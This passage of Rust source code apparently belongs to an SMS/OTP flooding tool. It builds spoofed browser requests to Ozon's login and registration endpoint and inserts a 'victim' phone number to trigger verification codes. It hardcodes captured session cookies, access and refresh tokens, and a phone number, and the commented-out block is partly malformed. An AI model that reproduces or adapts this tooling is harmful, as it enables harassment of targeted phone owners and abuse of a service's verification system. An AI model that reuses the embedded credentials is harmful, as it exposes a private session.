                service.headers.insert("Referer", r#"https://www.ozon.ru/ozonid-lite/?token=eyJhbGciOiJIUzI1NiIsIm96b25pZCI6Im5vdHNlbnNpdGl2ZSIsInR5cCI6IkpXVCJ9.eyJtb2RlIjoxLCJvcmlnaW4iOjEsIndlYmhvb2tfdXJsIjoiL296b25pZC9hdXRoUmVzcG9uc2VJZnJhbWUiLCJwYXlsb2FkIjpudWxsLCJyZXR1cm5fdXJsIjoiIiwicmVmZXJlcl9wYWdlX3R5cGUiOiJob21lIiwicmVxdWlyZWRfZmllbGRzIjpudWxsLCJwYXRjaF91c2VyX2FjY291bnRfcGFyYW1zIjpudWxsLCJiaW5kX2Nhc19pZCI6ZmFsc2UsInVzZV9vaWRjIjpmYWxzZSwib2lkY19kYXRhIjp7fSwiYm91bmRfdXNlcl9pZCI6MCwiaGlkZV9sb2dvIjpmYWxzZSwiYmluZF9yb2xlcyI6e30sImZvcmNlX2xvZ291dCI6ZmFsc2UsInRva2VuX2lkIjoiIiwicmV2b2NhYmxlIjpmYWxzZSwiY2FuX3NraXBfcGF0Y2giOmZhbHNlLCJiaW5kX2FkX2FjY291bnQiOmZhbHNlLCJleHAiOjE3MjMyMDQ3NjcsImlhdCI6MTcyMzExODM2NywiaXNzIjoib3pvbmlkIn0.JrrBzh-f0QV91KbBMravTnv9c2BLqwjeMKR6tQMqSpw&redirect=https%3A%2F%2Fwww.ozon.ru%2F%3F__rr%3D1&abt_att=1&origin_referer=www.google.com"#.parse().unwrap());
                service.headers.insert("x-o3-app-name", r#"dweb_client"#.parse().unwrap());
                service.headers.insert("x-o3-app-versiona", r#"release_8-7-2024_47c5f63b"#.parse().unwrap());
                service.headers.insert("x-o3-manifest-version", r#"47c5f63b89e288debd911d32752251f2bc79dccf"#.parse().unwrap());
                service.headers.insert("x-o3-parent-requestid", r#"fb3f5aa55301408c3c2c443370ed64a3"#.parse().unwrap());
                service.headers.insert("Origin", r#"https://www.ozon.ru"#.parse().unwrap());
                service.headers.insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
                service.headers.insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
                service.headers.insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
                service.headers.insert("Connection", r#"keep-alive"#.parse().unwrap());
                service.headers.insert("Cookie", r#"__Secure-ETC=92fb92c0ba11ae4d4fe2a759f7816084; abt_data=04cbe7bbef34e6d65d50c26e866ff7a0:62da88376496cb87bdd5e487a205e8a567ee292657ce1584fcfc98a596dd4c18522ad152afa759bddce3cd94562e6a532c6b746f78f4ff307fe445a817872335f070dbdeb4aac30c4d1a600930e668ccfd55cc3cc7594582b1e6bef10a17dce345e7bb9f5c4d8e5986cd2c11d9f4e348ec26078013bd82c623894c29ea8927db0d30fcf4ad12f2b1a6a3a75ee4153f2e4818cb4cc265ed531ba5d2c09df3556d18bb9d0a0d9d86eb9a04cfc0eaa64ffc636859a46ca8eda0913a6c3cb6d015b2e70afe3c1af117a8521709e3483a9ba663a99d5f93afa5bdc33fc69a2dc643d2a9bca1890640da08c438d7dff77697cf6e01f8fd62930c21aa23eb9dbcb6e8f582ba70a284cfa9039236e02361622cf04e8317b3d5cb2e17ba7802a65097f1e5d51caf78e211a741b5a4f19b8bd9710088a8542b05bfac6872b24cafaafef139; __Secure-access-token=5.0.0q55OL7sTjueeBvkQDRNyA.60.AdRZvkOEEPDmWOnyS5XiIYO1Mffd6AetR5neFKGJezO_SWayfesWlkVsprb56qw1MQ..20240808135812.E2BlramyrcypnUAErFZoA3OrU1xH31b5ykYiqBp1aSk.1bb0e2430e36bcf24; __Secure-refresh-token=5.0.0q55OL7sTjueeBvkQDRNyA.60.AdRZvkOEEPDmWOnyS5XiIYO1Mffd6AetR5neFKGJezO_SWayfesWlkVsprb56qw1MQ..20240808135812.xmU9-yOoRylDZCw7TgerGv2ubSHPxInjI70HXFC4Z8g.150c778ca83ff3f7b; __Secure-ab-group=60; __Secure-user-id=0; xcid=a07d60373e8d04ca4aa287e388b1f10f; __Secure-ext_xcid=a07d60373e8d04ca4aa287e388b1f10f; rfuid=LTIxNTUxOTYxNCwzNS43NDk5NzIwOTM4NTAzNzQsMTM3MDA2MzkxNSxJbnRlbCBNYWMgT1MgWCAxMC4xNSwtMTczNTk3NzI1MSxXM3NpYm1GdFpTSTZJbEJFUmlCV2FXVjNaWElpTENKa1pYTmpjbWx3ZEdsdmJpSTZJbEJ2Y25SaFlteGxJRVJ2WTNWdFpXNTBJRVp2Y20xaGRDSXNJbTFwYldWVWVYQmxjeUk2VzNzaWRIbHdaU0k2SW1Gd2NHeHBZMkYwYVc5dUwzQmtaaUlzSW5OMVptWnBlR1Z6SWpvaWNHUm1JbjBzZXlKMGVYQmxJam9pZEdWNGRDOXdaR1lpTENKemRXWm1hWGhsY3lJNkluQmtaaUo5WFgwc2V5SnVZVzFsSWpvaVEyaHliMjFsSUZCRVJpQldhV1YzWlhJaUxDSmtaWE5qY21sd2RHbHZiaUk2SWxCdmNuUmhZbXhsSUVSdlkzVnRaVzUwSUVadmNtMWhkQ0lzSW0xcGJXVlVlWEJsY3lJNlczc2lkSGx3WlNJNkltRndjR3hwWTJGMGFXOXVMM0JrWmlJc0luTjFabVpwZUdWeklqb2ljR1JtSW4wc2V5SjBlWEJsSWpvaWRHVjRkQzl3WkdZaUxDSnpkV1ptYVhobGN5STZJbkJrWmlKOVhYMHNleUp1WVcxbElqb2lRMmh5YjIxcGRXMGdVRVJHSUZacFpYZGxjaUlzSW1SbGMyTnlhWEIwYVc5dUlqb2lVRzl5ZEdGaWJHVWdSRzlqZFcxbGJuUWdSbTl5YldGMElpd2liV2x0WlZSNWNHVnpJanBiZXlKMGVYQmxJam9pWVhCd2JHbGpZWFJwYjI0dmNHUm1JaXdpYzNWbVptbDRaWE1pT2lKd1pHWWlmU3g3SW5SNWNHVWlPaUowWlhoMEwzQmtaaUlzSW5OMVptWnBlR1Z6SWpvaWNHUm1JbjFkZlN4N0ltNWhiV1VpT2lKTmFXTnliM052Wm5RZ1JXUm5aU0JRUkVZZ1ZtbGxkMlZ5SWl3aVpHVnpZM0pwY0hScGIyNGlPaUpRYjNKMFlXSnNaU0JFYjJOMWJXVnVkQ0JHYjNKdFlYUWlMQ0p0YVcxbFZIbHdaWE1pT2x0N0luUjVjR1VpT2lKaGNIQnNhV05oZEdsdmJpOXdaR1lpTENKemRXWm1hWGhsY3lJNkluQmtaaUo5TEhzaWRIbHdaU0k2SW5SbGVIUXZjR1JtSWl3aWMzVm1abWw0WlhNaU9pSndaR1lpZlYxOUxIc2libUZ0WlNJNklsZGxZa3RwZENCaWRXbHNkQzFwYmlCUVJFWWlMQ0prWlhOamNtbHdkR2x2YmlJNklsQnZjblJoWW14bElFUnZZM1Z0Wlc1MElFWnZjbTFoZENJc0ltMXBiV1ZVZVhCbGN5STZXM3NpZEhsd1pTSTZJbUZ3Y0d4cFkyRjBhVzl1TDNCa1ppSXNJbk4xWm1acGVHVnpJam9pY0dSbUluMHNleUowZVhCbElqb2lkR1Y0ZEM5d1pHWWlMQ0p6ZFdabWFYaGxjeUk2SW5Ca1ppSjlYWDFkLFd5SnlkUzFTVlNJc0luSjFMVkpWSWl3aWNuVWlMQ0psYmkxVlV5SXNJbVZ1SWwwPSwwLDEsMCwzMCwyMzc0MTU5MzAsLTEsMjI3MTI2NTIwLDAsMSwwLC00OTEyNzU1MjMsSUU1bGRITmpZWEJsSUVkbFkydHZJRTFoWTBsdWRHVnNJRFV1TUNBb1RXRmphVzUwYjNOb0tTQXlNREV3TURFd01TQk5iM3BwYkd4aCxlMzA9LDY1LC0xMjg1NTUxMywxLDEsLTEsMTY5OTk1NDg4NywxNjk5OTU0ODg3LDMzNjAwNzkzMyw0; guest=true; ADDRESSBOOKBAR_WEB_CLARIFICATION=1723118309; is_cookies_accepted=1"#.parse().unwrap());
                service.headers.insert("Priority", r#"u=4"#.parse().unwrap());
                service.headers.insert("TE", r#"trailers"#.parse().unwrap());

                let mut phone = victim.phone.clone();
                phone.format(WithPlus);

                let second = format!(r#""statusCode":"FAST_ENTRY_V3_OTP_REQUIRED","error":"","data":{"email":"","emailHint":"","phone":"79628622162","otpId":717645728,"otpChannel":"CHANNEL_PHONE","otpAddress":"79628622162","otp":"","isCheckAllowed":true,"resendAfter":20,"otpLength":6,"flashCallType":true,"firstOtpSentToEmail":false,"activeOtpSentToEmail":false,"IsEmailRegistrationState":false,"isExtraOtpRequested":false,"extraOtpChannel":"CHANNEL_PHONE","extraOtpAddress":"","extraOtpId":0,"extraIsCheckAllowed":true,"ExtraResendAfter":0,"accessToken":"","tokenType":"","expiresIn":0,"refreshToken":"","isRegistration":true,"isLongTimeNoSee":false,"isValuableAccount":false,"hideHints":false,"isRecognized":false,"isSecondFactor":false,"isEmployeeLogin":false,"isOtpExpired":false,"isAdsAllowed":false,"isVerifiedEmailError":false,"isForceSmsOtp":false,"isForceWhatsAppOtp":false,"isForceFlashCallOtp":false,"isWhatsAppFailed":false,"isFlashCallFailed":false,"countryCode":"RU","isSeller":false,"isAccountRecoveryAllowed":false,"sellerCountry":"","secondFactorCase":"UNSPECIFIED","hasBankAccount":false,"hasRecentActiveMobileSession":false,"externalTokenId":""},"storedData":null"#, ).to_string();

                service
                    .fields
                    .insert("asyncData".to_string(), "eyJ1cmwiOiIvb3pvbmlkLWxpdGU/YWJ0X2F0dD0xJm9yaWdpbl9yZWZlcmVyPXd3dy5nb29nbGUuY29tJnJlZGlyZWN0PWh0dHBzJTNBJTJGJTJGd3d3Lm96b24ucnUlMkYlM0ZfX3JyJTNEMSZ0b2tlbj1leUpoYkdjaU9pSklVekkxTmlJc0ltOTZiMjVwWkNJNkltNXZkSE5sYm5OcGRHbDJaU0lzSW5SNWNDSTZJa3BYVkNKOS5leUp0YjJSbElqb3hMQ0p2Y21sbmFXNGlPakVzSW5kbFltaHZiMnRmZFhKc0lqb2lMMjk2YjI1cFpDOWhkWFJvVW1WemNHOXVjMlZKWm5KaGJXVWlMQ0p3WVhsc2IyRmtJanB1ZFd4c0xDSnlaWFIxY201ZmRYSnNJam9pSWl3aWNtVm1aWEpsY2w5d1lXZGxYM1I1Y0dVaU9pSm9iMjFsSWl3aWNtVnhkV2x5WldSZlptbGxiR1J6SWpwdWRXeHNMQ0p3WVhSamFGOTFjMlZ5WDJGalkyOTFiblJmY0dGeVlXMXpJanB1ZFd4c0xDSmlhVzVrWDJOaGMxOXBaQ0k2Wm1Gc2MyVXNJblZ6WlY5dmFXUmpJanBtWVd4elpTd2liMmxrWTE5a1lYUmhJanA3ZlN3aVltOTFibVJmZFhObGNsOXBaQ0k2TUN3aWFHbGtaVjlzYjJkdklqcG1ZV3h6WlN3aVltbHVaRjl5YjJ4bGN5STZlMzBzSW1admNtTmxYMnh2WjI5MWRDSTZabUZzYzJVc0luUnZhMlZ1WDJsa0lqb2lJaXdpY21WMmIyTmhZbXhsSWpwbVlXeHpaU3dpWTJGdVgzTnJhWEJmY0dGMFkyZ2lPbVpoYkhObExDSmlhVzVrWDJGa1gyRmpZMjkxYm5RaU9tWmhiSE5sTENKbGVIQWlPakUzTWpNeU1EUTNOamNzSW1saGRDSTZNVGN5TXpFeE9ETTJOeXdpYVhOeklqb2liM3B2Ym1sa0luMC5KcnJCemgtZjBRVjkxS2JCTXJhdlRudjljMkJMcXdqZU1LUjZ0UU1xU3B3IiwiY2kiOnsidmVydGljYWwiOiJjc21hIiwibmFtZSI6ImxvZ2luT3JSZWdpc3RyYXRpb24iLCJwYXJhbXMiOlt7Im5hbWUiOiJwYXRjaFVzZXJBY2NvdW50VXJsIiwidGV4dCI6Imh0dHBzOi8vb3pvbi5ydS9vem9uaWQvcGF0Y2gtdXNlci1hY2NvdW50LWxpdGUvIn0seyJuYW1lIjoicGFnZVR5cGUiLCJ0ZXh0IjoibGl0ZSJ9XSwidmVyc2lvbiI6MSwibGF5b3V0SUQiOjExNDM1LCJpZCI6MzQwNTY3fX0=".to_string());
                service
                    .fields
                    .insert("".to_string(), );
                service
                    .fields
                    .insert("".to_string(), "".to_string());

                services.push(service)
            } */
        }
    }

    services
}
